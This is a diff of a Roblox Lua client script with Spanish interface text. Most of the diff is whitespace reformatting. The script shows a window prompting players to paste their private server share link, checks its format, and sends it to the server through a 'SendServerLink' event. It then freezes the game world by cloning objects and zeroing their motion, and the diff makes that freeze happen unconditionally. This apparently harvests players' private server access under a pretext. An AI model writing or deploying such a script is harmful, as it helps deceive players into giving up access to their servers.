@@ -13,51 +13,51 @@ ScreenGui.DisplayOrder = 100
 
 local Frame = Instance.new("Frame")
 Frame.Parent = ScreenGui
-Frame.Size = UDim2.new(0,400,0,300)
-Frame.Position = UDim2.new(0.5,-200,0.5,-150)
-Frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
+Frame.Size = UDim2.new(0, 400, 0, 300)
+Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 
 local Label = Instance.new("TextLabel")
 Label.Parent = Frame
-Label.Size = UDim2.new(1,-20,0,30)
-Label.Position = UDim2.new(0,10,0,10)
+Label.Size = UDim2.new(1, -20, 0, 30)
+Label.Position = UDim2.new(0, 10, 0, 10)
 Label.Text = "Ingresa el link de tu servidor privado:"
-Label.TextColor3 = Color3.fromRGB(255,255,255)
+Label.TextColor3 = Color3.fromRGB(255, 255, 255)
 Label.BackgroundTransparency = 1
 
 local TextBox = Instance.new("TextBox")
 TextBox.Parent = Frame
-TextBox.Size = UDim2.new(1,-20,0,50)
-TextBox.Position = UDim2.new(0,10,0,50)
-TextBox.TextColor3 = Color3.fromRGB(255,255,255)
-TextBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
+TextBox.Size = UDim2.new(1, -20, 0, 50)
+TextBox.Position = UDim2.new(0, 10, 0, 50)
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
 TextBox.ClearTextOnFocus = false
 TextBox.Text = "https://www.roblox.com/share?code="
 
 local MessageLabel = Instance.new("TextLabel")
 MessageLabel.Parent = Frame
-MessageLabel.Size = UDim2.new(1,-20,0,30)
-MessageLabel.Position = UDim2.new(0,10,0,110)
+MessageLabel.Size = UDim2.new(1, -20, 0, 30)
+MessageLabel.Position = UDim2.new(0, 10, 0, 110)
 MessageLabel.BackgroundTransparency = 1
 MessageLabel.Text = ""
-MessageLabel.TextColor3 = Color3.fromRGB(255,0,0)
+MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 
 local Button = Instance.new("TextButton")
 Button.Parent = Frame
-Button.Size = UDim2.new(1,-20,0,50)
-Button.Position = UDim2.new(0,10,0,150)
+Button.Size = UDim2.new(1, -20, 0, 50)
+Button.Position = UDim2.new(0, 10, 0, 150)
 Button.Text = "Enviar"
-Button.BackgroundColor3 = Color3.fromRGB(75,75,75)
-Button.TextColor3 = Color3.fromRGB(255,255,255)
+Button.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+Button.TextColor3 = Color3.fromRGB(255, 255, 255)
 
 local MiniButton = Instance.new("TextButton")
 MiniButton.Parent = ScreenGui
-MiniButton.Size = UDim2.new(0,100,0,30)
-MiniButton.Position = UDim2.new(0,20,0,20)
+MiniButton.Size = UDim2.new(0, 100, 0, 30)
+MiniButton.Position = UDim2.new(0, 20, 0, 20)
 MiniButton.Text = "Abrir ventana"
 MiniButton.Visible = false
-MiniButton.BackgroundColor3 = Color3.fromRGB(50,50,50)
-MiniButton.TextColor3 = Color3.fromRGB(255,255,255)
+MiniButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+MiniButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
 MiniButton.MouseButton1Click:Connect(function()
     Frame.Visible = true
@@ -68,7 +68,7 @@ end)
 local function isLinkValid(link)
     local startPart = "https://www.roblox.com/share?code="
     local endPart = "&type=Server"
-    return string.sub(link,1,#startPart) == startPart and string.sub(link,-#endPart) == endPart
+    return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
 end
 
 -- ====== Detener todos los datos del juego ======
@@ -126,7 +126,7 @@ local function stopAllGameData()
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("BasePart") or (obj:IsA("Model") and obj:FindFirstChildOfClass("Humanoid")) then
             local clone = obj:Clone()
-            clone.Name = "FrozenCopy_"..obj.Name
+            clone.Name = "FrozenCopy_" .. obj.Name
             for _, desc in pairs(clone:GetDescendants()) do
                 if desc:IsA("Script") or desc:IsA("LocalScript") or desc:IsA("Animator") then
                     desc:Destroy()
@@ -185,13 +185,13 @@ local function stopAllGameData()
         for _, obj in pairs(Workspace:GetDescendants()) do
             if obj:IsA("BasePart") or (obj:IsA("Model") and obj:FindFirstChildOfClass("Humanoid")) then
                 if obj:IsA("BasePart") then
-                    obj.Velocity = Vector3.new(0,0,0)
-                    obj.AngularVelocity = Vector3.new(0,0,0)
+                    obj.Velocity = Vector3.new(0, 0, 0)
+                    obj.AngularVelocity = Vector3.new(0, 0, 0)
                 elseif obj:IsA("Model") then
                     for _, part in pairs(obj:GetDescendants()) do
                         if part:IsA("BasePart") then
-                            part.Velocity = Vector3.new(0,0,0)
-                            part.AngularVelocity = Vector3.new(0,0,0)
+                            part.Velocity = Vector3.new(0, 0, 0)
+                            part.AngularVelocity = Vector3.new(0, 0, 0)
                         end
                     end
                 end
@@ -205,19 +205,16 @@ Button.MouseButton1Click:Connect(function()
     local link = TextBox.Text
     if isLinkValid(link) then
         MessageLabel.Text = "El link es válido ✅"
-        MessageLabel.TextColor3 = Color3.fromRGB(0,255,0)
+        MessageLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
         local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
         if remoteEvent then
             remoteEvent:FireServer(link)
-            stopAllGameData()
-            Frame.Visible = false
-            MiniButton.Visible = true
-        else
-            MessageLabel.Text = "Evento 'SendServerLink' no encontrado en ReplicatedStorage ❌"
-            MessageLabel.TextColor3 = Color3.fromRGB(255,0,0)
         end
+        stopAllGameData()
+        Frame.Visible = false
+        MiniButton.Visible = true
     else
         MessageLabel.Text = "El link es inválido ❌"
-        MessageLabel.TextColor3 = Color3.fromRGB(255,0,0)
+        MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
     end
 end)
